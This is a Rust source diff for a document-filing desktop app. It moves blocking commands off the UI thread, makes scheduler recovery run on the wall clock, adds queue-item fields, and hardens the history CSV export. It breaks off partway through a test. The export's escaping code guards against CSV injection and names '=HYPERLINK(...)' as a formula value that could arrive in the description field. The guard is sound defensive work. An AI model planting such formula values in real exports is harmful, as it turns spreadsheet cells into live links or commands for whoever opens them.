@@ -4,7 +4,7 @@ use std::{
         Arc, Mutex, RwLock,
         atomic::{AtomicBool, AtomicU64, Ordering},
     },
-    time::Duration,
+    time::{Duration, Instant},
 };
 
 use intern_core::{
@@ -128,6 +128,18 @@ pub struct QueueItemDto {
     /// the name it was filed under, and the machine when it was not this one.
     #[serde(skip_serializing_if = "Option::is_none")]
     near_duplicate_of: Option<String>,
+    /// Where the document is filed, as the rename that filed it chose: the
+    /// folder the layout put it in and any ` (2)` the destination needed,
+    /// neither of which the proposal knows. `None` when it is not filed.
+    filed_path: Option<String>,
+    /// The leaf of `filed_path`.
+    filed_name: Option<String>,
+    /// A completed item that was never renamed: the person kept its name.
+    kept_original: bool,
+    /// Review is waiting on the files, not on a decision about the name: an
+    /// operation never finished, and Check again - or a confirmed remove -
+    /// is what moves the item on.
+    parked: bool,
 }
 
 #[derive(Clone, Debug, Serialize)]
@@ -232,11 +244,14 @@ impl TauriPipelineEvents {
         let _ = self.pipeline.set(Arc::downgrade(pipeline));
     }
 
-    fn paused(&self) -> bool {
+    /// Whether the queue is paused, and why, when it stopped itself.
+    fn pause_state(&self) -> (bool, Option<String>) {
         self.pipeline
             .get()
             .and_then(std::sync::Weak::upgrade)
-            .is_some_and(|pipeline| pipeline.is_paused())
+            .map_or((false, None), |pipeline| {
+                (pipeline.is_paused(), pipeline.pause_reason())
+            })
     }
 }
 
@@ -245,16 +260,24 @@ impl TauriPipelineEvents {
 /// The queue pauses itself - a hosted model that refuses the key, a shared
 /// lease that cannot be taken - and the window only heard "something
 /// changed", so it went on offering to pause a queue that had already
-/// stopped. Every change now says which it is.
-fn queue_changed_payload(paused: bool) -> serde_json::Value {
-    serde_json::json!({ "paused": paused })
+/// stopped. Every change now says which it is, and a queue that stopped
+/// itself for a failure every document would share - an account out of
+/// credit, missing text-recognition files - says which failure, so the
+/// window can say what to fix before resuming.
+fn queue_changed_payload(paused: bool, reason: Option<&str>) -> serde_json::Value {
+    match reason {
+        Some(reason) if paused => serde_json::json!({ "paused": true, "error": reason }),
+        _ => serde_json::json!({ "paused": paused }),
+    }
 }
 
 impl PipelineEventSink for TauriPipelineEvents {
     fn queue_changed(&self) {
-        let _ = self
-            .app
-            .emit("queue://changed", queue_changed_payload(self.paused()));
+        let (paused, reason) = self.pause_state();
+        let _ = self.app.emit(
+            "queue://changed",
+            queue_changed_payload(paused, reason.as_deref()),
+        );
     }
     fn progress(&self, progress: PipelineProgress) {
         let _ = self.app.emit("queue://progress", progress);
@@ -1514,8 +1537,60 @@ pub(crate) enum SchedulerMessage {
     Shutdown,
 }
 
-fn scheduler_actions(timed_out: bool, model_ready: bool) -> (bool, bool) {
-    (timed_out, model_ready)
+/// How often the scheduler looks for operations to recover.
+const RECOVER_INTERVAL: Duration = Duration::from_secs(65);
+
+/// Whether this pass of the scheduler recovers, and whether it drains.
+///
+/// Recovery used to run only when 65 seconds passed with no wake at all, and
+/// every document the intake watcher enqueues is a wake: a scanner dropping a
+/// page every half minute put recovery off for as long as it kept scanning,
+/// and an operation left applying held the whole queue for all of that time.
+/// It now runs on the wall clock, whatever woke the scheduler.
+fn scheduler_actions(
+    timed_out: bool,
+    model_ready: bool,
+    elapsed_since_recover: Duration,
+) -> (bool, bool) {
+    (
+        timed_out || elapsed_since_recover >= RECOVER_INTERVAL,
+        model_ready,
+    )
+}
+
+/// When the scheduler last recovered: how long it may wait for a message
+/// before recovery is due, and what each pass does.
+///
+/// The loop's own timing is where recovery used to go missing - a wait that
+/// started its 65 seconds over at every wake - so it is kept here, where a
+/// test can drive it with the clock it chooses.
+struct RecoverClock {
+    last_recover: Instant,
+}
+
+impl RecoverClock {
+    fn new(now: Instant) -> Self {
+        Self { last_recover: now }
+    }
+
+    /// How long to wait for a message: no longer than until recovery is due.
+    fn wait(&self, now: Instant) -> Duration {
+        RECOVER_INTERVAL.saturating_sub(now.saturating_duration_since(self.last_recover))
+    }
+
+    /// What this pass does - whether it recovers, and whether it drains -
+    /// counting from the last pass that recovered.
+    fn pass(&mut self, timed_out: bool, model_ready: bool, now: Instant) -> (bool, bool) {
+        let actions = scheduler_actions(
+            timed_out,
+            model_ready,
+            now.saturating_duration_since(self.last_recover),
+        );
+        if actions.0 {
+            self.last_recover = now;
+        }
+        actions
+    }
 }
 
 struct PipelineScheduler {
@@ -1535,15 +1610,21 @@ impl PipelineScheduler {
         let join = std::thread::Builder::new()
             .name("intern-pipeline-scheduler".into())
             .spawn(move || {
+                let mut clock = RecoverClock::new(Instant::now());
                 loop {
-                    let timed_out = match receiver.recv_timeout(Duration::from_secs(65)) {
+                    // Wait no longer than the next recovery is due, so it
+                    // runs on time even when nothing wakes the scheduler.
+                    let timed_out = match receiver.recv_timeout(clock.wait(Instant::now())) {
                         Ok(SchedulerMessage::Shutdown) => return,
                         Ok(SchedulerMessage::Wake) => false,
                         Err(std::sync::mpsc::RecvTimeoutError::Timeout) => true,
                         Err(std::sync::mpsc::RecvTimeoutError::Disconnected) => return,
                     };
-                    let (recover, drain) =
-                        scheduler_actions(timed_out, model_ready.load(Ordering::SeqCst));
+                    let (recover, drain) = clock.pass(
+                        timed_out,
+                        model_ready.load(Ordering::SeqCst),
+                        Instant::now(),
+                    );
                     if recover && let Err(error) = scheduled_pipeline.recover() {
                         let _ = app.emit(
                             "queue://changed",
@@ -2131,15 +2212,55 @@ pub async fn queue_cancel(id: String, state: State<'_, AppState>) -> Result<(), 
     Ok(())
 }
 
+/// Retries a failed document, or checks again the files of one whose rename
+/// never finished.
+///
+/// Blocking: checking again reconciles the rename, which waits out a sync
+/// client's hold on the file for seconds at a time and hashes the document in
+/// full, so it runs off the thread WebView2 delivers invokes on.
 #[tauri::command]
-pub fn queue_retry(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
-    state.pipeline.retry(parse_item_id(&id)?)?;
+pub async fn queue_retry(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.retry(id))
+        .await
+        .map_err(|_| background_task_failed("retry"))??;
     state.schedule()
 }
 
+/// Reads a document waiting for review again, from the start: Re-analyze,
+/// for a document signed or edited after it was read, or a reading a person
+/// would rather have done again than correct by hand.
+///
+/// Blocking: the file is fingerprinted again, in full, wherever it lives.
 #[tauri::command]
-pub fn queue_remove(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
-    state.pipeline.remove(parse_item_id(&id)?)?;
+pub async fn queue_reanalyze(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.reanalyze(id))
+        .await
+        .map_err(|_| background_task_failed("re-analysis"))??;
+    state.schedule()
+}
+
+/// Removes an item. `confirmed` is the person saying they have resolved the
+/// files of an operation that never finished; without it such an item is
+/// refused, as before. Absent from older windows, which never confirm.
+///
+/// Blocking: the item's rows are deleted from the queue database, and a write
+/// waits out another connection's - the intake watcher's, the scheduler's -
+/// for up to the five-second busy timeout.
+#[tauri::command]
+pub async fn queue_remove(
+    id: String,
+    confirmed: Option<bool>,
+    state: State<'_, AppState>,
+) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.remove(id, confirmed.unwrap_or(false)))
+        .await
+        .map_err(|_| background_task_failed("removal"))??;
     Ok(())
 }
 
@@ -2171,28 +2292,60 @@ pub fn house_rules_list(state: State<'_, AppState>) -> Result<Vec<LearnedRuleDto
 
 /// Stop applying a learned spelling; documents still waiting go back to
 /// the document's own words. Takes effect at once.
+///
+/// Blocking: every waiting document is renamed again in the queue, which
+/// lists the folder each one is going to.
 #[tauri::command]
-pub fn house_rule_forget(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
-    state.pipeline.forget_rule(parse_item_id(&id)?)?;
+pub async fn house_rule_forget(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.forget_rule(id))
+        .await
+        .map_err(|_| background_task_failed("spelling change"))??;
     Ok(())
 }
 
 /// Apply a learned spelling from now on without waiting for a second edit.
+///
+/// Blocking, as forgetting one is.
 #[tauri::command]
-pub fn house_rule_use(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
-    state.pipeline.use_rule(parse_item_id(&id)?)?;
+pub async fn house_rule_use(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.use_rule(id))
+        .await
+        .map_err(|_| background_task_failed("spelling change"))??;
     Ok(())
 }
 
+/// Blocking: a queue database write, which can wait out another
+/// connection's for up to the five-second busy timeout.
 #[tauri::command]
-pub fn proposal_keep_original(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
-    state.pipeline.keep_original(parse_item_id(&id)?)?;
+pub async fn proposal_keep_original(
+    id: String,
+    state: State<'_, AppState>,
+) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.keep_original(id))
+        .await
+        .map_err(|_| background_task_failed("keep original"))??;
     Ok(())
 }
 
+/// Puts a filed document back where it came from.
+///
+/// Blocking: the undo hashes the document in full, waits out a sync client's
+/// hold on it, and for a filing on another volume copies it all the way back.
+/// For a large scan on a network share, the window was "Not Responding" for
+/// as long as that took.
 #[tauri::command]
-pub fn operation_undo(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
-    state.pipeline.undo(parse_item_id(&id)?)?;
+pub async fn operation_undo(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.undo(id))
+        .await
+        .map_err(|_| background_task_failed("undo"))??;
     Ok(())
 }
 
@@ -2732,9 +2885,14 @@ fn validate_description_settings(settings: &AppSettings) -> Result<(), CommandEr
     Ok(())
 }
 
+/// Blocking: whether OneDrive is running is asked of tasklist.exe, and the
+/// cloud folders are read from the sync client's own configuration.
 #[tauri::command]
-pub fn intake_status(state: State<'_, AppState>) -> Result<IntakeStatusDto, CommandError> {
-    state.intake_status_dto()
+pub async fn intake_status(state: State<'_, AppState>) -> Result<IntakeStatusDto, CommandError> {
+    let app = state.app.clone();
+    tauri::async_runtime::spawn_blocking(move || app.state::<AppState>().intake_status_dto())
+        .await
+        .map_err(|_| background_task_failed("intake status"))?
 }
 
 #[tauri::command]
@@ -2781,10 +2939,13 @@ pub async fn hosted_model_test(
 
 /// The OneDrive accounts and SharePoint libraries the sync client keeps on
 /// this machine. A local lookup of the sync client's own configuration; no
-/// network request is made.
+/// network request is made, but it reads the registry and the sync client's
+/// files, so it runs off the invoke thread.
 #[tauri::command]
-pub fn cloud_roots() -> Result<Vec<CloudRootDto>, CommandError> {
-    Ok(list_cloud_roots())
+pub async fn cloud_roots() -> Result<Vec<CloudRootDto>, CommandError> {
+    tauri::async_runtime::spawn_blocking(list_cloud_roots)
+        .await
+        .map_err(|_| background_task_failed("cloud folder lookup"))
 }
 
 /// How many documents a folder already holds, counted exactly as adding the
@@ -2802,43 +2963,57 @@ pub async fn intake_folder_documents(path: String) -> Result<usize, CommandError
 
 /// Creates the "Filed" folder beside a chosen intake folder, or finds the one
 /// already there, and returns where it is.
+///
+/// Blocking: the folder can be on a network share.
 #[tauri::command]
-pub fn filed_folder_create(intake_folder: String) -> Result<String, CommandError> {
-    let intake = canonical_folder(Path::new(&intake_folder))?;
-    let filed = filed_folder_for(&intake).ok_or_else(|| CommandError {
-        code: "FILED_FOLDER_UNAVAILABLE".into(),
-        message: "a drive's top folder has nothing beside it to file into".into(),
-    })?;
-    std::fs::create_dir_all(&filed).map_err(|error| CommandError {
-        code: "FILED_FOLDER_UNAVAILABLE".into(),
-        message: format!("the Filed folder could not be created: {error}"),
-    })?;
-    Ok(display_path(&filed))
+pub async fn filed_folder_create(intake_folder: String) -> Result<String, CommandError> {
+    tauri::async_runtime::spawn_blocking(move || -> Result<String, CommandError> {
+        let intake = canonical_folder(Path::new(&intake_folder))?;
+        let filed = filed_folder_for(&intake).ok_or_else(|| CommandError {
+            code: "FILED_FOLDER_UNAVAILABLE".into(),
+            message: "a drive's top folder has nothing beside it to file into".into(),
+        })?;
+        std::fs::create_dir_all(&filed).map_err(|error| CommandError {
+            code: "FILED_FOLDER_UNAVAILABLE".into(),
+            message: format!("the Filed folder could not be created: {error}"),
+        })?;
+        Ok(display_path(&filed))
+    })
+    .await
+    .map_err(|_| background_task_failed("Filed folder creation"))?
 }
 
 /// Creates (or finds) an "Inbox" folder inside a OneDrive or SharePoint
 /// folder's own top folder, for folder setup to watch: a Filed folder beside
 /// the top folder would sit outside what OneDrive syncs. Refused for any
 /// other folder, so the webview cannot make folders anywhere it likes.
+///
+/// Blocking: every cloud folder the sync client keeps is canonicalized to
+/// find this one among them.
 #[tauri::command]
-pub fn inbox_folder_create(root: String) -> Result<String, CommandError> {
-    let unavailable = |message: String| CommandError {
-        code: "INBOX_FOLDER_UNAVAILABLE".into(),
-        message,
-    };
-    let root = canonical_folder(Path::new(&root))?;
-    let synced = intern_intake::detect_cloud_roots()
-        .iter()
-        .any(|candidate| canonical_folder(&candidate.root).is_ok_and(|found| found == root));
-    if !synced {
-        return Err(unavailable(
-            "only a OneDrive or SharePoint folder's top folder gets an Inbox".into(),
-        ));
-    }
-    let inbox = root.join("Inbox");
-    std::fs::create_dir_all(&inbox)
-        .map_err(|error| unavailable(format!("the Inbox folder could not be created: {error}")))?;
-    Ok(display_path(&inbox))
+pub async fn inbox_folder_create(root: String) -> Result<String, CommandError> {
+    tauri::async_runtime::spawn_blocking(move || -> Result<String, CommandError> {
+        let unavailable = |message: String| CommandError {
+            code: "INBOX_FOLDER_UNAVAILABLE".into(),
+            message,
+        };
+        let root = canonical_folder(Path::new(&root))?;
+        let synced = intern_intake::detect_cloud_roots()
+            .iter()
+            .any(|candidate| canonical_folder(&candidate.root).is_ok_and(|found| found == root));
+        if !synced {
+            return Err(unavailable(
+                "only a OneDrive or SharePoint folder's top folder gets an Inbox".into(),
+            ));
+        }
+        let inbox = root.join("Inbox");
+        std::fs::create_dir_all(&inbox).map_err(|error| {
+            unavailable(format!("the Inbox folder could not be created: {error}"))
+        })?;
+        Ok(display_path(&inbox))
+    })
+    .await
+    .map_err(|_| background_task_failed("Inbox folder creation"))?
 }
 
 /// Starts OneDrive, or opens its folder when it is already running.
@@ -2868,20 +3043,30 @@ pub struct BackfillResultDto {
 /// and not undone, for a records folder switched on after the fact. Each
 /// document's record is rewritten from the queue's own copy of its sentence
 /// and facts, so running it twice changes nothing.
+///
+/// Blocking: one durable write per filed document, into the destination,
+/// which is often a synced or shared folder - hundreds of them, for a
+/// destination that has been in use for a while.
 #[tauri::command]
-pub fn descriptions_backfill(
+pub async fn descriptions_backfill(
     state: State<'_, AppState>,
 ) -> Result<BackfillResultDto, CommandError> {
-    let settings = state.settings.load()?;
-    if !settings.record_descriptions {
-        return Err(CommandError {
-            code: "DESCRIPTIONS_DISABLED".into(),
-            message: "turn on description records and save before writing them".into(),
-        });
-    }
-    let documents = state.pipeline.filed_documents()?;
-    let (written, failed) = state.ledger.backfill(&documents);
-    Ok(BackfillResultDto { written, failed })
+    let app = state.app.clone();
+    tauri::async_runtime::spawn_blocking(move || -> Result<BackfillResultDto, CommandError> {
+        let state = app.state::<AppState>();
+        let settings = state.settings.load()?;
+        if !settings.record_descriptions {
+            return Err(CommandError {
+                code: "DESCRIPTIONS_DISABLED".into(),
+                message: "turn on description records and save before writing them".into(),
+            });
+        }
+        let documents = state.pipeline.filed_documents()?;
+        let (written, failed) = state.ledger.backfill(&documents);
+        Ok(BackfillResultDto { written, failed })
+    })
+    .await
+    .map_err(|_| background_task_failed("description backfill"))?
 }
 
 #[tauri::command]
@@ -2924,9 +3109,14 @@ pub fn setup_choose_existing(
         .choose_existing(ExistingModelSelection { model_path })
 }
 
+/// Blocking: one delete over the whole finished history, and a database
+/// write can wait out another connection's for up to the busy timeout.
 #[tauri::command]
-pub fn history_clear(state: State<'_, AppState>) -> Result<(), CommandError> {
-    state.pipeline.clear_history()?;
+pub async fn history_clear(state: State<'_, AppState>) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    tauri::async_runtime::spawn_blocking(move || pipeline.clear_history())
+        .await
+        .map_err(|_| background_task_failed("history clearing"))??;
     Ok(())
 }
 
@@ -2995,19 +3185,48 @@ fn history_export_failed(message: impl Into<String>) -> CommandError {
     }
 }
 
+/// The newest finished renames and undos, up to [`HISTORY_LIMIT`];
+/// `history_count` says how many there are in all.
+///
+/// Blocking: every queue item's proposal is read for its sentence.
 #[tauri::command]
-pub fn history_list(state: State<'_, AppState>) -> Result<Vec<HistoryEntryDto>, CommandError> {
-    let descriptions = descriptions_by_item(&state)?;
-    Ok(state
-        .history
-        .list_operation_history(HISTORY_LIMIT)
-        .map_err(history_read_error)?
-        .into_iter()
-        .map(|entry| {
-            let description = descriptions.get(&entry.queue_item_id).cloned();
-            history_entry_dto(entry, description)
-        })
-        .collect())
+pub async fn history_list(
+    state: State<'_, AppState>,
+) -> Result<Vec<HistoryEntryDto>, CommandError> {
+    let app = state.app.clone();
+    tauri::async_runtime::spawn_blocking(move || -> Result<Vec<HistoryEntryDto>, CommandError> {
+        let state = app.state::<AppState>();
+        let descriptions = descriptions_by_item(&state)?;
+        Ok(state
+            .history
+            .list_operation_history(HISTORY_LIMIT)
+            .map_err(history_read_error)?
+            .into_iter()
+            .map(|entry| {
+                let description = descriptions.get(&entry.queue_item_id).cloned();
+                history_entry_dto(entry, description)
+            })
+            .collect())
+    })
+    .await
+    .map_err(|_| background_task_failed("history listing"))?
+}
+
+/// How many finished renames and undos there are in all. `history_list`
+/// stops at [`HISTORY_LIMIT`]; with this beside it a window can say that it
+/// has, and the export writes every one. A separate command, so the
+/// listing's shape stays what every window already reads.
+#[tauri::command]
+pub async fn history_count(state: State<'_, AppState>) -> Result<usize, CommandError> {
+    let app = state.app.clone();
+    tauri::async_runtime::spawn_blocking(move || {
+        app.state::<AppState>()
+            .history
+            .count_operation_history()
+            .map_err(history_read_error)
+    })
+    .await
+    .map_err(|_| background_task_failed("history count"))?
 }
 
 /// Where the history CSV may be written.
@@ -3040,30 +3259,48 @@ fn history_export_destination(path: &str) -> Result<&Path, CommandError> {
     Ok(destination)
 }
 
-/// Writes the rename history to `path` as RFC 4180 CSV and reports how many
-/// operations were written.
+/// Writes the whole rename history to `path` as RFC 4180 CSV and reports how
+/// many operations were written.
+///
+/// Every one of them: the export used the window's listing and stopped at
+/// five hundred rows without saying so, while the dialog promised every
+/// rename Intern had applied. Blocking, for the reads and the write.
 #[tauri::command]
-pub fn history_export(path: String, state: State<'_, AppState>) -> Result<usize, CommandError> {
-    let destination = history_export_destination(&path)?;
-    let entries = state
-        .history
-        .list_operation_history(HISTORY_LIMIT)
-        .map_err(history_read_error)?;
-    let descriptions = descriptions_by_item(&state)?;
-    std::fs::write(destination, history_csv(&entries, &descriptions))
-        .map_err(|_| history_export_failed("the history CSV could not be written"))?;
-    Ok(entries.len())
+pub async fn history_export(
+    path: String,
+    state: State<'_, AppState>,
+) -> Result<usize, CommandError> {
+    let app = state.app.clone();
+    tauri::async_runtime::spawn_blocking(move || -> Result<usize, CommandError> {
+        let state = app.state::<AppState>();
+        let destination = history_export_destination(&path)?;
+        let entries = state
+            .history
+            .list_all_operation_history()
+            .map_err(history_read_error)?;
+        let descriptions = descriptions_by_item(&state)?;
+        std::fs::write(destination, history_csv(&entries, &descriptions))
+            .map_err(|_| history_export_failed("the history CSV could not be written"))?;
+        Ok(entries.len())
+    })
+    .await
+    .map_err(|_| background_task_failed("history export"))?
 }
 
 /// Renders history entries as RFC 4180 CSV: CRLF row endings, and any field
 /// containing a comma, quote, or line break is quoted with quotes doubled.
 /// The description column is last, so a spreadsheet opened from this export
 /// can be pasted straight into a SharePoint grid view beside the filenames.
+///
+/// The file starts with a UTF-8 byte-order mark. Excel opens a CSV without
+/// one in the ANSI code page, which turned every accented party name and
+/// curly quote into mojibake.
 fn history_csv(
     entries: &[HistoryEntry],
     descriptions: &std::collections::HashMap<i64, String>,
 ) -> String {
-    let mut csv = String::from("at,direction,kind,stage,originalPath,newPath,description\r\n");
+    let mut csv =
+        String::from("\u{FEFF}at,direction,kind,stage,originalPath,newPath,description\r\n");
     for entry in entries {
         let fields = [
             iso8601_utc(entry.at),
@@ -3100,8 +3337,19 @@ fn history_csv(
     csv
 }
 
+/// One CSV field, quoted only where RFC 4180 needs it - and never a formula.
+///
+/// A spreadsheet runs a cell that starts with = + - @, a tab or a carriage
+/// return as a formula, and the description column is model text a document
+/// can steer, or a reviewer's edit: '=HYPERLINK(...)' became a live link in
+/// the auditor's spreadsheet. Such a value is prefixed with an apostrophe and
+/// quoted, so it opens as the text it is (OWASP's CSV-injection guidance).
+/// That changes the cell text of those rare rows, which is the right trade
+/// for an export people open by double-click.
 fn csv_field(value: &str) -> String {
-    if value.contains([',', '"', '\n', '\r']) {
+    if value.starts_with(['=', '+', '-', '@', '\t', '\r']) {
+        format!("\"'{}\"", value.replace('"', "\"\""))
+    } else if value.contains([',', '"', '\n', '\r']) {
         format!("\"{}\"", value.replace('"', "\"\""))
     } else {
         value.to_owned()
@@ -3198,11 +3446,10 @@ fn queue_item_dto(item: PipelineItem) -> Result<QueueItemDto, CommandError> {
                     .map(|name| format!("Duplicate of {name}"))
             }),
         error_code: item.error_code.map(|code| code.as_str().to_owned()),
-        undoable: item.status == QueueStatus::Completed
-            && item.receipt.as_ref().is_some_and(|receipt| {
-                receipt.direction == OperationDirection::Apply
-                    && receipt.stage == OperationStage::Complete
-            }),
+        // The apply that filed the document, not the newest receipt: an undo
+        // that was refused and rolled back used to take the Undo button away
+        // from a document that was still filed.
+        undoable: item.status == QueueStatus::Completed && item.filed_receipt.is_some(),
         proposal_revision: proposal.map(|record| record.revision.to_string()),
         reconciliation,
         suggested_date: proposal.and_then(|record| suggested_date(&record.analysis)),
@@ -3218,6 +3465,25 @@ fn queue_item_dto(item: PipelineItem) -> Result<QueueItemDto, CommandError> {
             .map(|record| record.house_rules.iter().map(HouseRuleDto::from).collect())
             .unwrap_or_default(),
         near_duplicate_of: proposal.and_then(|record| record.near_duplicate_of.clone()),
+        filed_path: item
+            .filed_receipt
+            .as_ref()
+            .map(|receipt| display_path(&receipt.destination)),
+        filed_name: item.filed_receipt.as_ref().and_then(|receipt| {
+            receipt
+                .destination
+                .file_name()
+                .map(|name| name.to_string_lossy().into_owned())
+        }),
+        kept_original: item.status == QueueStatus::Completed && item.filed_receipt.is_none(),
+        parked: (item.status == QueueStatus::NeedsReview && item.unsettled_receipt.is_some())
+            || matches!(
+                item.error_code,
+                Some(
+                    intern_core::ErrorCode::SourceDeleteFailed
+                        | intern_core::ErrorCode::ReconciliationRequired
+                )
+            ),
     })
 }
 
@@ -3877,11 +4143,26 @@ mod queue_event_tests {
     #[test]
     fn a_queue_change_says_whether_the_queue_is_paused() {
         assert_eq!(
-            queue_changed_payload(true),
+            queue_changed_payload(true, None),
             serde_json::json!({ "paused": true })
         );
         assert_eq!(
-            queue_changed_payload(false),
+            queue_changed_payload(false, None),
+            serde_json::json!({ "paused": false })
+        );
+    }
+
+    /// The window shows `error` as the reason the queue stopped, so a queue
+    /// that stopped itself names the failure, and one that is running again
+    /// names none even if a stale reason were offered.
+    #[test]
+    fn a_queue_that_stopped_itself_says_why() {
+        assert_eq!(
+            queue_changed_payload(true, Some("HOSTED_MODEL_BILLING")),
+            serde_json::json!({ "paused": true, "error": "HOSTED_MODEL_BILLING" })
+        );
+        assert_eq!(
+            queue_changed_payload(false, Some("HOSTED_MODEL_BILLING")),
             serde_json::json!({ "paused": false })
         );
     }
@@ -3889,13 +4170,20 @@ mod queue_event_tests {
 
 #[cfg(test)]
 mod ipc_thread_tests {
-    use super::{hosted_model_test, queue_cancel, queue_list, settings_save};
+    use super::{
+        cloud_roots, descriptions_backfill, filed_folder_create, history_clear, history_count,
+        history_export, history_list, hosted_model_test, house_rule_forget, house_rule_use,
+        inbox_folder_create, intake_status, operation_undo, proposal_keep_original, queue_cancel,
+        queue_list, queue_reanalyze, queue_remove, queue_retry, settings_save,
+    };
 
     /// Accepts a command only if calling it returns a future. WebView2
     /// delivers every invoke on one thread, so a command whose body blocks
     /// there freezes the whole window while it runs.
+    fn leaves_the_ipc_thread_0<R: std::future::Future, F: FnOnce() -> R>(_: F) {}
     fn leaves_the_ipc_thread<A, R: std::future::Future, F: FnOnce(A) -> R>(_: F) {}
     fn leaves_the_ipc_thread_2<A, B, R: std::future::Future, F: FnOnce(A, B) -> R>(_: F) {}
+    fn leaves_the_ipc_thread_3<A, B, C, R: std::future::Future, F: FnOnce(A, B, C) -> R>(_: F) {}
 
     #[test]
     fn commands_that_can_block_for_seconds_do_not_run_on_the_ipc_thread() {
@@ -3909,6 +4197,41 @@ mod ipc_thread_tests {
         leaves_the_ipc_thread_2(settings_save);
         // One file stat per reviewable item, on whatever the documents live on.
         leaves_the_ipc_thread(queue_list);
+    }
+
+    #[test]
+    fn decisions_on_one_document_do_not_run_on_the_ipc_thread() {
+        // Hashes the filed document, waits out holds on it, and copies it
+        // back across volumes.
+        leaves_the_ipc_thread_2(operation_undo);
+        // Checking an unsettled rename again reconciles it: lock retries and
+        // full hashes.
+        leaves_the_ipc_thread_2(queue_retry);
+        // Fingerprints the file again, in full.
+        leaves_the_ipc_thread_2(queue_reanalyze);
+        // Database writes that can wait out another connection's.
+        leaves_the_ipc_thread_3(queue_remove);
+        leaves_the_ipc_thread_2(proposal_keep_original);
+        // Renames every waiting document again, listing each target folder.
+        leaves_the_ipc_thread_2(house_rule_forget);
+        leaves_the_ipc_thread_2(house_rule_use);
+    }
+
+    #[test]
+    fn history_records_and_folder_lookups_do_not_run_on_the_ipc_thread() {
+        // Every proposal is read for its sentence; the export also writes.
+        leaves_the_ipc_thread(history_list);
+        leaves_the_ipc_thread(history_count);
+        leaves_the_ipc_thread_2(history_export);
+        leaves_the_ipc_thread(history_clear);
+        // One durable write per filed document, into a synced folder.
+        leaves_the_ipc_thread(descriptions_backfill);
+        // tasklist.exe, and the sync client's configuration.
+        leaves_the_ipc_thread(intake_status);
+        leaves_the_ipc_thread_0(cloud_roots);
+        // Folders on whatever the person chose, a network share included.
+        leaves_the_ipc_thread(filed_folder_create);
+        leaves_the_ipc_thread(inbox_folder_create);
     }
 }
 
@@ -4110,14 +4433,75 @@ mod background_task_tests {
 
 #[cfg(test)]
 mod scheduler_tests {
-    use super::{ExistingModelFilesDto, scheduler_actions};
+    use std::time::{Duration, Instant};
+
+    use super::{ExistingModelFilesDto, RECOVER_INTERVAL, RecoverClock, scheduler_actions};
 
     #[test]
     fn timer_recovers_but_does_not_drain_until_model_is_ready() {
-        assert_eq!(scheduler_actions(true, false), (true, false));
-        assert_eq!(scheduler_actions(false, false), (false, false));
-        assert_eq!(scheduler_actions(false, true), (false, true));
-        assert_eq!(scheduler_actions(true, true), (true, true));
+        let recently = Duration::from_secs(1);
+        assert_eq!(scheduler_actions(true, false, recently), (true, false));
+        assert_eq!(scheduler_actions(false, false, recently), (false, false));
+        assert_eq!(scheduler_actions(false, true, recently), (false, true));
+        assert_eq!(scheduler_actions(true, true, recently), (true, true));
+    }
+
+    #[test]
+    fn scheduler_runs_recover_on_wall_clock_even_with_frequent_wakes() {
+        // A scanner dropping a page into the watched folder every thirty
+        // seconds: every pass is a wake, and none of them ever times out.
+        let wake_every = Duration::from_secs(30);
+        let mut since_recover = Duration::ZERO;
+        let mut recovered_at = Vec::new();
+        for wake in 1..=10_u32 {
+            since_recover += wake_every;
+            let (recover, drain) = scheduler_actions(false, true, since_recover);
+            assert!(drain, "every wake drains a ready queue");
+            if recover {
+                recovered_at.push(wake);
+                since_recover = Duration::ZERO;
+            }
+        }
+        // Recovery is due every 65 seconds, so the third wake (90s) runs it,
+        // and so does every third wake after.
+        assert_eq!(recovered_at, vec![3, 6, 9]);
+
+        assert!(!scheduler_actions(false, false, RECOVER_INTERVAL - Duration::from_millis(1)).0);
+        assert!(scheduler_actions(false, false, RECOVER_INTERVAL).0);
+    }
+
+    /// The loop's own clock, not only the decision: the wait it asks for and
+    /// the recovery it records. A loop that restarted its wait at every wake,
+    /// or never recorded a recovery, passed the test above and still never
+    /// recovered - or recovered at every pass.
+    #[test]
+    fn the_scheduler_clock_recovers_every_65_seconds_through_wakes_30_seconds_apart() {
+        let start = Instant::now();
+        let at = |seconds: u64| start + Duration::from_secs(seconds);
+        let mut clock = RecoverClock::new(start);
+        assert_eq!(clock.wait(start), RECOVER_INTERVAL);
+
+        let mut recovered_at = Vec::new();
+        let mut waits = Vec::new();
+        for seconds in (30..=300).step_by(30) {
+            let (recover, drain) = clock.pass(false, true, at(seconds));
+            assert!(drain);
+            if recover {
+                recovered_at.push(seconds);
+            }
+            waits.push(clock.wait(at(seconds)).as_secs());
+        }
+
+        assert_eq!(recovered_at, vec![90, 180, 270]);
+        // After each recovery the next is a full interval away; between them
+        // the wait shrinks to what is left, never starting over.
+        assert_eq!(waits, vec![35, 5, 65, 35, 5, 65, 35, 5, 65, 35]);
+
+        // A timeout recovers whenever it comes, and restarts the interval.
+        let (recover, _) = clock.pass(true, false, at(310));
+        assert!(recover);
